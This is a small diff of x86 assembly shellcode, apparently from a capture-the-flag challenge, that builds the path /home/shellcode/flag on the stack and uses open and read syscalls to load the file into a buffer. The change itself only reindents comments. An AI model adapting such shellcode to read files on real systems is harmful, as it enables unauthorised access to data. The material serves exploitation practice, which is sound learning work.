@@ -15,13 +15,13 @@ _start:                     ; this is where code starts getting exec'ed
     push 0x68732f65     ;hs/e
     push 0x6d6f682f     ;moh/
 
-	; open /home/shellcode/flag
+    ; open /home/shellcode/flag
     mov ebx, esp      ; mov string's address to ebx 
     mov al,0x5        ; open(
     xor ecx, ecx      ;   read-only mode ( O_RDONLY )
     int 0x80          ; );
 
-	; read /home/shellcode/flag to a buffer
+    ; read /home/shellcode/flag to a buffer
     mov ebx,eax       ;  file_descriptor,
     mov al,0x3        ;  read(
     mov ecx, mybuf    ;   mov buffer address to ecx 
